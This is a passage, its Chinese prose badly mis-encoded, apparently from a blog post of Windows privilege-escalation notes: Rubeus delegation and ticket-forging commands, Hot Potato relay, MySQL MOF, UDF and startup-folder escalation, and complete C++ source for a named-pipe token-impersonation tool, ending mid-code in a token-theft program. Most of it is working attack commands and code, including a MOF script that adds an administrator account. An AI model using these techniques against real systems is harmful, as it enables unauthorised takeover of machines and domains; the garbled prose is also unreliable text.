&#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose æ­¤å‘½ä»¤å¯ä»¥æ¸…é™¤ msds-allowedtoactonbehalfofotheridentityå±æ€§çš„å€¼ ç°åœ¨éƒ½ç»Ÿç»Ÿè®¾ç½®å¥½äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥å§ã€‚ç½‘ä¸Šä¸€èˆ¬ç”¨çš„rubeusï¼Œè¿™é‡Œæˆ‘ç”¨kekeoå§ Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx æœ¬åœ°è¿ç®—å‡ºæœºå™¨ç”¨æˆ·ntlm hash è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„å›¾ Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt å†™å…¥ç¥¨æ® ç„¶åæˆ‘åœ¨æœ¬æœºä½¿ç”¨ä»¥ä¸Šæ–¹æ³•åklistä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨ç¥¨æ® ä½†æ˜¯dir \\test1\\c$æ—¶æœ¬æœºè«åå…¶å¦™ä¸èƒ½è¿›è¡ŒkerberoséªŒè¯ï¼Œæˆ‘æœäº†ã€‹ã€‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæˆ‘ä»¬æ‹¿åˆ°é“¶ç¥¨äº† æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡ è‹¥æˆ‘ä»¬çš„administratorç”¨æˆ·è¢«è®¾ç½®ä¸ºæ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾æˆ–è€…è¢«åŠ å…¥ä¿æŠ¤ç»„ï¼ŒæŒ‰ç†è¯´ä»–çš„è®¿é—®å°±ä¸èƒ½è¿›è¡Œå§”æ´¾ã€‚ æˆ‘ä»¬åœ¨ä»¥administratorè´¦æˆ·èº«ä»½è¿›è¡ŒS4Uæ—¶ï¼Œåªèƒ½è¿›è¡ŒS4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚æˆ‘ä»¬ç”¨ Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /pttç»§ç»­å®éªŒadministratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ · æ­¤æ—¶æˆ‘ä»¬ç”¨ rubeus.exe describe /ticker:S4Ubase64åŠ å¯†çš„ç¥¨æ® å¯ä»¥å‘ç°servicenameå¹¶æ²¡æœ‰æŒ‡å®šæŸä¸ªæœåŠ¡ï¼Œä»…ä»…åªæœ‰ä¸€ä¸ªè´¦æˆ·.å³å‘ç”Ÿäº†æœåŠ¡åç§°ç¼ºå¤±çš„é—®é¢˜ã€‚å¾ˆç®€å•ï¼ŒæŠŠç¥¨æ®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†.ç½‘ä¸Šå¾ˆå¤šè¯´ç”¨è¿™ä¸ªå·¥å…·https://www.pkisolutions.com/tools/asn1editor/ä½†å®é™…ä¸Šrubeusä¹Ÿèƒ½å®Œæˆç¥¨æ®ä¿®æ”¹rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt å®Œäº‹ POTATO å®¶æ—hot potatoçƒ­åœŸè±†ææƒã€‚å¾ˆæ—©å‰å°±å¬è¯´è¿‡äº†ï¼Œä½†ä¸€ç›´æ²¡å»äº†è§£è¿‡ã€‚å‰ç½®çŸ¥è¯†æ˜¯ntlm relay,å¯ä»¥å»äº†è§£äº†è§£ã€‚ potatoå®¶æ—æœ‰å¾ˆå¤šï¼Œhot potatoåªæ˜¯å…¶ä¸­ä¸€ç§ææƒæ–¹å¼ã€‚æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä¸èƒ½å¾ˆå¥½çš„å¤ç°ğŸ™ƒï¼ŒæŠ“åŒ…åˆ†æå•¥çš„å…ˆå’•å’•å§ã€‚ https://github.com/foxglovesec/PotatoğŸ‘ˆå·¥å…·https://foxglovesecurity.com/2016/01/16/hot-potato/ ğŸ‘ˆHOT POTATOæŠ€æœ¯æ–‡æ¡£ï¼Œå›½å†…åŸºæœ¬ä¸Šç¿»è¯‘è¿™ä¸ªæ¥çš„ã€‚ ææƒæ­¥éª¤å¤§æ¦‚æ˜¯è¿™ä¸ªæµç¨‹1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª—2.wpadåŠ«æŒ3.HTTP-&gt;SMB çš„ ntlm relay 1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª— WindowsåŸŸåè§£æè§„åˆ™æ˜¯æœ¬åœ°HOSTæ–‡ä»¶-ã€‹dnsæŸ¥è¯¢-ã€‹NBNSæˆ–è€…LLMNRæŸ¥è¯¢ä¸€æ—¦æœ¬åœ°å‘å‡ºNBNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬æœ¬åœ°å°±å¯ä»¥è¿…é€Ÿå“åº”ï¼Œå•ªçš„ä¸€ä¸‹å°±å“åº”äº†ï¼Œå¾ˆå¿«å•Šï¼Œæœ¬åœ°å‘åŒ…å¾ˆå¿«ï¼Œåªè¦å‘å‡ºNBNSåŒ…åŸºæœ¬ä¸Šéƒ½èƒ½è¢«æˆ‘ä»¬æœ¬åœ°å‘åŒ…å“åº”ã€‚ä½†æ˜¯ä»¥ä¸Šæ­¥éª¤è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚çš„ï¼šæˆ‘ä»¬å½“å‰å¹¶éç®¡ç†å‘˜æƒé™ï¼Œå¤§å‡ ç‡æ˜¯æ— æ³•å—…æ¢æœ¬åœ°æµé‡çš„,å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿäº‹å…ˆçŸ¥é“ç›®æ ‡ä¸»æœºæœŸæœ›NBNSæŸ¥è¯¢è·å¾—çš„ä¸»æœºåï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªå“åº”ï¼Œå¯¹å‘é€NBNSæŸ¥è¯¢çš„é‚£ä¸ªä¸»æœºå¿«é€Ÿçš„å¤§é‡å‘é€NBNSå“åº” .ä½†æ˜¯nbnsæµé‡åŒ…è¿˜æœ‰ä¸ªå«ç‰¹å¾ç çš„ä¸œè¥¿ï¼Œè¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„ç‰¹å¾ç å¿…é¡»ç›¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬è¢«è¿«å‘é€65536ä¸ªåŒ…çˆ†ç ´è¿™ä¸ªç‰¹å¾ç â€”â€”æœ¬åœ°å‘åŒ…é€Ÿåº¦å¾ˆå¿«ï¼Œæœ¬åœ°NBNSæ¬ºéª—æˆåŠŸç‡åŸºæœ¬ä¸Šåœ¨100%ã€‚ 2.WPADåŠ«æŒ NBNSæ¬ºéª—åæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒWPADçš„åŸŸåï¼ŒæŠŠè‡ªå·±ä¼ªé€ ç§°WPADå¹¶è¿”å›è‡ªå®šä¹‰çš„PACæ–‡ä»¶ã€‚æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æŠŠæœ¬åœ°å‘å‡ºçš„æ‰€æœ‰æµé‡é‡å®šå‘ã€‚ 3.RELAY åœ¨ç°åœ¨è¿™ä¸ªå¹´ä»£ï¼ŒSMB-&gt;SMBçš„relayå¾ˆå°‘ç”¨åˆ°äº†ï¼Œå¾®è½¯ ç¦ç”¨äº†åŒåè®®çš„NTLMè®¤è¯ ï¼ŒæˆåŠŸç‡å¾ˆä½ã€‚ä½†æ˜¯HTTP-&gt;SMBçš„relayè¿˜æ˜¯æœ‰çš„ã€‚HOT POTATOå°±æ˜¯åˆ©ç”¨çš„è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å¯ä»¥æŠŠä¸»æœºå‘å‡ºçš„HTTPè¯·æ±‚é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ç½‘é¡µAï¼Œè€Œç½‘é¡µAéœ€è¦NTLMè®¤è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒHTTP-&gt;SMBçš„relayâ€™äº†ã€‚å½“HTTPè¯·æ±‚æ¥è‡ªäºé«˜æƒé™çš„è´¦æˆ·æ—¶ï¼Œä¾‹å¦‚æ˜¯æ¥è‡ªwindows æ›´æ–°æœåŠ¡çš„è¯·æ±‚ï¼Œå‘½ä»¤å°±ä¼šä»¥â€NT AUTHORITY\\SYSTEMâ€æƒé™è¿è¡Œã€‚ HOT POTATO æ ¹æ®Windowsç‰ˆæœ¬çš„ä¸åŒï¼Œéœ€è¦ç­‰å¾…é«˜æƒé™ç”¨æˆ·NTLMè®¤è¯æ¥åˆ°çš„æ—¶é—´ä¹Ÿä¸åŒã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒWIN7æ˜¯ç¬é—´å°±å¯ä»¥ææƒçš„Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8æœ‰ä¸€ä¸ªè‡ªåŠ¨æ›´æ–°æœºåˆ¶ï¼Œä¼šæ¯å¤©ä¸‹è½½è¯ä¹¦ä¿¡ä»»åˆ—è¡¨(CTLs),etc MYSQLä¸‹çš„ææƒæŠ€æœ¯MOFææƒåœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„nullevt.mofæ¯åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡ï¼ˆç”±â€And TargetInstance.Second = 5â€³;æ§åˆ¶ï¼Œè¿™é‡Œè¾“å…¥5å°±æ˜¯æ¯åˆ†é’Ÿçš„ç¬¬äº”ç§’æ‰§è¡Œã€‚ é‚£ä¹ˆæŠŠcmdå‘½ä»¤æ·»åŠ åˆ°nullevt.mofä¸­ï¼Œcmdå‘½ä»¤å°±ä¼šè‡ªåŠ¨æ‰§è¡Œäº†ã€‚ å‰ææ˜¯æˆ‘ä»¬è¦èƒ½è¿›å…¥æ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä¸”mysqlæ•°æ®åº“çš„æƒé™å°½å¯èƒ½é«˜æ‰æ›´æœ‰åˆ©ã€‚åŒæ—¶secure-file-priv è¦ä¸ºç©ºï¼ˆ mysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULL,ç¦æ­¢æ‰€æœ‰æ–‡ä»¶å¯¼å…¥å¯¼å‡ºåŠŸèƒ½ï¼‰ æˆ‘ä»¬ä¼ªé€ çš„MOFæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ #pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace &#x3D; &quot;Root\\\\Cimv2&quot;; Name &#x3D; &quot;filtP2&quot;; Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second &#x3D; 5&quot;; QueryLanguage &#x3D; &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name &#x3D; &quot;consPCSV2&quot;; ScriptingEngine &#x3D; &quot;JScript&quot;; ScriptText &#x3D; &quot;var WSH &#x3D; new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user admin admin &#x2F;add\\&quot;)&quot;; &#x2F;&#x2F;ä¿®æ”¹æ­¤å¤„å³å¯&#125;; instance of __FilterToConsumerBinding &#123; Consumer &#x3D; $Consumer; Filter &#x3D; $EventFilter; &#125;; ä¿®æ”¹ä¸Šé¢çš„cmdéƒ¨åˆ†å³å¯å®ç°ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå„ç§å‘½ä»¤ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨mysqlä¸‹çš„å‘½ä»¤ ï¼Œå°†mofè¦†ç›–è¿‡å»ã€‚å¾…æˆ‘ä»¬çš„å‘½ä»¤è¢«æ‰§è¡Œåï¼Œå³ä»£è¡¨ææƒæˆåŠŸã€‚Windows 2003ä¼¼ä¹æˆåŠŸç‡è›®é«˜çš„ï¼ŒWIN7è¯•äº†è¯•æ²¡ååº”ã€‚ã€‚ã€‚ UDFææƒï¼ˆè¿™ä¸ªä¹Ÿå¯ä»¥linuxææƒ udfï¼Œå³è‡ªå®šä¹‰å‡½æ•°ï¼ˆuser define functionï¼‰ MYSQLå¯ä»¥è‡ªå®šä¹‰å‡½æ•°çš„ã€‚è‡ªå®šä¹‰å‡½æ•°åœ¨Windowsä¸‹æ˜¯ä»¥DLLæ–‡ä»¶å­˜åœ¨äºMYSQLçš„æ’ä»¶æ–‡ä»¶å¤¹é‡Œé¢çš„ï¼ˆlinuxåˆ™æ˜¯ä»¥osçš„å½¢å¼ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªæ¶æ„dllï¼Œé‡Œé¢å­˜æ”¾ç€å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ å‡½æ•°ã€‚ç„¶åäº¤ç»™mysqlä»¥æ•°æ®åº“æƒé™æ‰§è¡Œã€‚ å‰æï¼šæˆ‘ä»¬èƒ½æ“ä½œæ•°æ®åº“ï¼Œä¸”æ•°æ®åº“æƒé™å¿…é¡»å¾ˆé«˜ï¼ˆæˆ‘ä»¬ç”¨è¿™ä¸ªæ–¹æ³•ææƒåˆ°çš„æƒé™å°±æ˜¯æ•°æ®åº“çš„æƒé™ é‚£ä¹ˆè¿™ä¸ªdllæ–‡ä»¶å“ªé‡Œæ¥å‘¢ã€‚sqlmapå’Œmsféƒ½æœ‰ã€‚sqlmapä¸‹çš„ sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ å°±æ˜¯è¿™ä¸ªdllæ–‡ä»¶çš„ç¼–ç ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä½¿ç”¨sqlmapä¸‹çš„sqlmap/extra/cloak/cloak.pyå¯¹å…¶è¿›è¡Œè§£ç è·å¾—dllæ–‡ä»¶ã€‚ python .&#x2F;cloak.py -d -i .&#x2F;lib_mysqludf_sys.dll_ å³å¯è·å¾—dllæ–‡ä»¶ ç„¶åæˆ‘ä»¬æŠŠdllæ–‡ä»¶æ”¾å…¥mysqlçš„æ’ä»¶æ–‡ä»¶å¤¹ï¼Œå‘½åä¸ºudf.dllã€‚æ’ä»¶æ–‡ä»¶å¤¹å¯ä»¥é€šè¿‡å‘½ä»¤ show variables like &quot;%plugin%&quot;;è·å¾— ï¼ˆ&#x2F;lib&#x2F;pluginæ–‡ä»¶å¤¹éœ€è¦è‡ªå·±åˆ›å»ºï¼‰ è‡³äºæ€ä¹ˆæŠŠdllæ”¾å…¥æ’ä»¶æ–‡ä»¶å¤¹ 1.ç›´æ¥ç²˜è´´å¤åˆ¶ ï¼ˆæƒé™å¯èƒ½ä¸å¤Ÿ2.ä½¿ç”¨å‘½ä»¤ select load_file(â€˜udf.dllâ€™) into dumpfile â€œPLUGINçš„è·¯å¾„â€;(éœ€è¦secure_file_privä¸ºç©º æ€»ä¹‹ï¼Œå¦‚æœæŠŠudf.dllæ”¾å…¥pluginæ–‡ä»¶å¤¹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œææƒäº†ã€‚ create funtion sys_eval returns string soname &quot;udf.dll&quot;;select sys_eval(&#39;cmd&#39;); å¯åŠ¨é¡¹ææƒè¯´ç™½äº†ï¼Œå°±æ˜¯é€šè¿‡mysqlçš„é«˜æƒé™ï¼Œå‘windowså¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹é‡Œæ”¾å…¥æ¶æ„vbsæˆ–è€…batè„šæœ¬,æœºå™¨é‡å¯åè‡ªåŠ¨æ‰§è¡Œã€‚æ€ä¹ˆè®©æœºå™¨é‡å¯ï¼Ÿç­‰ç®¡ç†å‘˜æˆ–è€… ä¸€äº›å¯å¯¼è‡´æœåŠ¡å™¨è“å±çš„EXPå¯åŠ¨é¡¹è·¯å¾„ä¸€èˆ¬ä¸ºï¼šC:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;; æ²¡ä»€ä¹ˆå¥½è¯´çš„ å‘½åç®¡é“ææƒææƒæ–¹å¼ä¸º ä»¤ç‰Œæ¨¡ä»¿ã€‚ Token Impersonation . meterpreterçš„getsystemçš„æå–æ–¹æ³•ä¹‹ä¸€å°±æ˜¯è¿™ä¸ªæ–¹æ³• ææƒè¿‡ç¨‹ä¸ºä»administratorç”¨æˆ·æåˆ°SYSTEMæƒé™ã€‚ä»æ™®é€šç”¨æˆ·ææƒåˆ°adminåŠä»¥ä¸Šæƒé™æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·åˆ›å»ºçš„å‘½åç®¡é“æ²¡æœ‰ SeImpersonatePrivilegeï¼Œåœ¨å¤åˆ¶ä»¤ç‰Œæ—¶ä¼šå‡ºç°1346é”™è¯¯ã€‚ è¯¥æ–¹æ³•æŠ€æœ¯ç»†èŠ‚ä¸ºï¼šä»¥ç®¡ç†å‘˜æƒé™åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œå†é€šè¿‡åˆ›å»ºSYSTEMæƒé™æœåŠ¡ï¼Œè®©æœåŠ¡è¿ä¸Šå‘½åç®¡é“ï¼Œéšåæˆ‘ä»¬é€šè¿‡æ¨¡æ‹Ÿå®¢æˆ·ç«¯ï¼Œè·å¾—SYSTEMæƒé™çš„ä»¤ç‰Œï¼Œéšåå°†å…¶å¤åˆ¶ï¼Œå†ç”¨å¤åˆ¶åçš„ä»¤ç‰Œåˆ›å»ºæ–°è¿›ç¨‹ï¼ˆå¦‚CMD)ï¼Œæ–°è¿›ç¨‹çš„æƒé™å³SYSTEMæƒé™ã€‚ è¿™é‡Œè´´ä¸Šå®ç°ä»£ç .é¦–å…ˆæ˜¯è¢«åˆ›å»ºçš„æœåŠ¡çš„å®ç°ä»£ç ï¼Œè¯¥æœåŠ¡å¯åŠ¨åä¼šä¸æ–­å‘æœåŠ¡å™¨å‘½åç®¡é“å»ºç«‹é“¾æ¥ç”Ÿæˆå¥½åï¼Œæ˜¯Service.exe #include&lt;Windows.h&gt;#include&lt;iostream&gt;SERVICE_STATUS m_ServiceStatus;SERVICE_STATUS_HANDLE m_ServiceStatusHandle;BOOL bRunning;void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);void WINAPI HandlerFunc(DWORD code);int main() &#123; WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;; SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;; StartServiceCtrlDispatcher(Table);&#125;void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123; m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode &#x3D; 0; m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc); m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus); bRunning &#x3D; true; while (bRunning) &#123; LPCWSTR PipeName &#x3D; L&quot;\\\\\\\\.\\\\pipe\\\\testpipe&quot;; HANDLE PipeHandle&#x3D;NULL; BOOL PipeInstance; WCHAR message[512] &#x3D; &#123; 0 &#125;; DWORD bytesWritten &#x3D; 0; BOOL Flag &#x3D; true; wchar_t message2[] &#x3D; L&quot;HELL&quot;; DWORD messageLength &#x3D; lstrlen(message2) * 2; do &#123; PipeHandle &#x3D; CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); &#125; while (PipeHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE); WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL); Flag &#x3D; ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL); std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl; &#125;&#125;void WINAPI HandlerFunc(DWORD code) &#123; switch (code) &#123; case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode &#x3D; 0; m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus); bRunning &#x3D; false; break; case SERVICE_CONTROL_INTERROGATE: break; &#125;&#125; ç„¶åæ˜¯ä¸»ä½“ï¼Œå‘½åç®¡é“æœåŠ¡å™¨ã€‚ç”Ÿæˆåæ˜¯Server.exe #include&lt;Windows.h&gt;#include&lt;iostream&gt;int main() &#123; LPCWSTR pipeName &#x3D; L&quot;\\\\\\\\.\\\\pipe\\\\testpipe&quot;; LPVOID pipeBuffer &#x3D; NULL; HANDLE serverPipe; DWORD readBytes &#x3D; 0; DWORD readBuffer &#x3D; 0; int err &#x3D; 0; BOOL isPipeConnected; BOOL isPipeOpen; wchar_t message[] &#x3D; L&quot;HELL&quot;; DWORD messageLenght &#x3D; lstrlen(message) * 2; DWORD bytesWritten &#x3D; 0; WCHAR message2[512] &#x3D; &#123; 0 &#125;;&#x2F;&#x2F;Open a Named Pipe,Wait for a connection std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl; serverPipe &#x3D; CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);&#x2F;&#x2F;Create a service of system to connect to our NamedPipe. char servicename[] &#x3D; &quot;Service.exe&quot;; char servicepath[_MAX_PATH]; SERVICE_STATUS status; GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath)); SC_HANDLE scManager &#x3D; OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if (GetLastError() &#x3D;&#x3D; 0) &#123; &#125; else &#123; std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; SC_HANDLE scService &#x3D; CreateServiceA(scManager, servicename, servicename, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, servicepath, NULL, NULL, NULL, NULL, NULL); if (!scService) &#123; if (GetLastError() &#x3D;&#x3D; 1073) &#123; std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; &#125; SC_HANDLE scServiceA &#x3D; OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS); if (StartService(scServiceA, 0, NULL)) &#123; std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl; &#125; else &#123; if (GetLastError() &#x3D;&#x3D; 1056) &#123; std::cout &lt;&lt; &quot;service is running,don&#39;t need to start again&quot; &lt;&lt; std::endl; &#125; &#125;&#x2F;&#x2F;Connect ! isPipeConnected &#x3D; ConnectNamedPipe(serverPipe, NULL); if (isPipeConnected) &#123; std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl; ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL); std::cout &lt;&lt; message2; &#125; else &#123; std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl; &#125; std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl; WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);&#x2F;&#x2F;Toekn Impersonation std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl; if (!ImpersonateNamedPipeClient(serverPipe)) &#123; std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl; &#125; STARTUPINFOA si; PROCESS_INFORMATION pi &#x3D; &#123;&#125;; ZeroMemory(&amp;pi, sizeof(pi)); ZeroMemory(&amp;si, sizeof(si)); si.cb &#x3D; sizeof(si); HANDLE token; if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) &#123; std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; CHAR command1[] &#x3D; &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;; WCHAR command2[] &#x3D; L&quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;; HANDLE Token; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) &#123; std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl; &#125; if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123; std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl; if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl; &#125; &#125; else &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl; &#125; while(1)&#123;&#125;&#125; æˆ‘ä»¬ç”Ÿæˆäº†Service.exe,ç„¶åæŠŠä»–ç§»åˆ°Server.exeåŒçº§ç›®å½•ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡ŒServer.exe,å³å¯è¾¾åˆ°admin-ã€‹systemçš„ææƒã€‚ ç¨‹åºå†™äº†å››å¤©ç»ˆäºå†™å¥½äº†ã€‚ã€‚WIN7ä¸‹å¯ä»¥å®ç°å®Œç¾ææƒã€‚é¡¹ç›®åœ°å€:https://github.com/ConsT27/EvilNamedPipe/tree/1.0 ä»¤ç‰Œçªƒå–SYSTEM-&gt;æœ¬æœºä¸Šå…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬åŸŸç”¨æˆ·ï¼‰(å¥½å®¶ä¼™ï¼Œåªè¦æœ¬æœºæœ‰systemæƒé™ï¼ŒåŸŸç®¡æ•¢åœ¨æœ¬æœºä¸Šåˆ›å»ºè¿›ç¨‹å°±ç›´æ¥èƒ½æ‹¿åˆ°åŸŸç®¡æƒé™ï¼‰ æˆ–è€…adminè·å–debugæƒé™åå»è·å–SYSTEMæƒé™ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œåªæœ‰ownerä¸ºadministratorçš„SYSTEMè¿›ç¨‹æ‰èƒ½è¢«åˆ©ç”¨ï¼Œæ¯”å¦‚lsassï¼Œdllhost) æŠ€æœ¯ç»†èŠ‚:é€šè¿‡å¯»æ‰¾é«˜æƒé™å¼€å¯çš„è¿›ç¨‹ï¼Œå†å¤åˆ¶å…¶ä»¤ç‰Œç”¨ä»¥åˆ›å»ºæ–°è¿›ç¨‹ï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„ #include &lt;iostream&gt;#include &lt;Windows.h&gt;&#x2F;&#x2F;Only administrator can get debug privBOOL GetDebugPriv() &#123; HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123; std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; tp.PrivilegeCount &#x3D; 1; tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED; if 